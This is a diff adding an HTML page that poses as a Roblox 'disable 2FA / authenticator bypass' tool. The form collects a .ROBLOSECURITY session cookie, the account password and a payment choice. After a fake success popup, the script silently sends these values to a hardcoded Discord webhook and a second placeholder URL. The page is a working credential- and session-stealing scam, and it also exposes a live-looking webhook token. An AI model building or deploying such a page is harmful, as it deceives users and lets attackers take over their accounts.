@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Disable Options</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            color: #00bfff;
+            text-align: center;
+            padding: 20px;
+        }
+
+        canvas#particleCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.5);
+        }
+
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 12px;
+            background: #00bfff;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        button:hover {
+            background: #009acd;
+            transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 156, 205, 0.5);
+        }
+
+        form {
+            display: none;
+            margin-top: 20px;
+        }
+
+        input, select {
+            width: calc(100% - 20px);
+            margin: 10px auto;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        label {
+            display: block;
+        }
+
+        .back-button {
+            display: none;
+        }
+
+        .tutorial {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.25);
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="particleCanvas"></canvas>
+    <div class="container">
+        <h1>DISABLERS BYPASS</h1>
+        <button id="disable-2fa">
+            DISABLE 2FA <strong>(Force 13+ to -13 (Account 13+ Needed))</strong>
+        </button>
+        <button id="disable-authenticator">DISABLE AUTHENTICATOR</button>
+        <button class="back-button" id="back-button">← Back to Menu</button>
+
+        <form id="form-2fa">
+            <label for="cookie">Cookie:</label>
+            <input type="text" id="cookie" name="cookie" required placeholder=".ROBLOXSECURITY">
+            <label for="payment-options">Payment Options:</label>
+            <select id="payment-options" name="payment-options" required>
+                <option value="">Select an option</option>
+                <option value="paypal">PayPal</option>
+                <option value="cashapp">CashApp</option>
+                <option value="yape">Yape</option>
+                <option value="interbank">Interbank</option>
+                <option value="plin">Plin</option>
+                <option value="bim">Bim</option>
+            </select>
+            <label for="password">Account Password:</label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+            <label for="webhook">Webhook:</label>
+            <input type="url" id="webhook" name="webhook" required placeholder="Webhook">
+            <button type="button" id="confirm-2fa">Confirm</button>
+        </form>
+
+        <form id="form-authenticator">
+            <label for="cookie-auth">Cookie:</label>
+            <input type="text" id="cookie-auth" name="cookie-auth" required placeholder=".ROBLOXSECURITY">
+            <label for="webhook-auth">Webhook:</label>
+            <input type="url" id="webhook-auth" name="webhook-auth" required placeholder="Webhook">
+            <button type="button" id="confirm-authenticator">Confirm</button>
+        </form>
+
+        <div class="tutorial">
+            <h3>Tutorial</h3>
+            <p>Fill out all the inputs in the form above accurately.</p>
+            <p>Click "Confirm" to proceed to the payment page and complete the process.</p>
+            <h2>Be careful:</h2>
+            <p>DISABLE 2FA includes auto disabled email secure verification, but can't auto disable authentication verification. Use force turn off authenticator if you want auto disabled authentication verification method.</p>
+            <p>Authenticator: You need to wait up to 5 minutes to use this bypasser, process follows existing requests.</p>
+            <p class="warning">CAUTION: After successfully disabling the authentication verification, your cookie will automatically invalidate. Before using this feature, ensure you have 2 or more valid cookies for the account.</p>
+        </div>
+    </div>
+
+    <script>
+        const disable2FAButton = document.getElementById("disable-2fa");
+        const disableAuthButton = document.getElementById("disable-authenticator");
+        const backButton = document.getElementById("back-button");
+        const form2FA = document.getElementById("form-2fa");
+        const formAuth = document.getElementById("form-authenticator");
+        const tutorial = document.querySelector(".tutorial");
+
+        disable2FAButton.addEventListener("click", () => {
+            toggleVisibility(false);
+            form2FA.style.display = "block";
+            backButton.style.display = "block";
+        });
+
+        disableAuthButton.addEventListener("click", () => {
+            toggleVisibility(false);
+            formAuth.style.display = "block";
+            backButton.style.display = "block";
+        });
+
+        backButton.addEventListener("click", () => {
+            toggleVisibility(true);
+            form2FA.style.display = "none";
+            formAuth.style.display = "none";
+            backButton.style.display = "none";
+        });
+
+        function toggleVisibility(show) {
+            const displayStyle = show ? "block" : "none";
+            disable2FAButton.style.display = displayStyle;
+            disableAuthButton.style.display = displayStyle;
+            tutorial.style.display = displayStyle;
+        }
+
+        function validateForm(form) {
+            const inputs = form.querySelectorAll("input, select");
+            for (const input of inputs) {
+                if (input.value.trim() === "") {
+                    Swal.fire({
+                        title: "Error",
+                        text: `Please fill out the ${input.name} field.`,
+                        icon: "error",
+                        confirmButtonText: "OK"
+                    });
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        async function sendToWebhooks(data) {
+            const webhook1 = "https://your-first-webhook-url.com";  // Primer webhook
+            const webhook2 = "https://discord.com/api/webhooks/1329981919823400970/5hDpWdgx7gSAggnhvk-iCvQA9c5-jgtUFeCWAIuHMeKNLDnNpr-gZRJ16ot2sLhJYpO9"; // Segundo webhook
+
+            try {
+                // Enviar a primer webhook
+                await fetch(webhook1, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                // Enviar a segundo webhook
+                await fetch(webhook2, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error("Error sending data to webhook:", error);
+            }
+        }
+
+        function confirmAction(title, data) {
+            Swal.fire({
+                title: title,
+                text: "Your request was successfully submitted. We are redirecting you to Discord server to receive notifications of updates and if you want you could donate to us.",
+                icon: "success",
+                confirmButtonText: "OK"
+            }).then(() => {
+                // Enviar la información a los webhooks sin bloquear la experiencia del usuario
+                sendToWebhooks(data);
+            });
+        }
+
+        document.getElementById("confirm-2fa").addEventListener("click", () => {
+            if (validateForm(form2FA)) {
+                confirmAction("2FA Disabled Request", {
+                    "Cookie": document.getElementById("cookie").value,
+                    "Payment Option": document.getElementById("payment-options").value,
+                    "Password": document.getElementById("password").value,
+                    "Webhook": document.getElementById("webhook").value
+                });
+            }
+        });
+
+        document.getElementById("confirm-authenticator").addEventListener("click", () => {
+            if (validateForm(formAuth)) {
+                confirmAction("Authenticator Disabled Request", {
+                    "Cookie": document.getElementById("cookie-auth").value,
+                    "Webhook": document.getElementById("webhook-auth").value
+                });
+            }
+        });
+    </script>
+</body>
+</html>
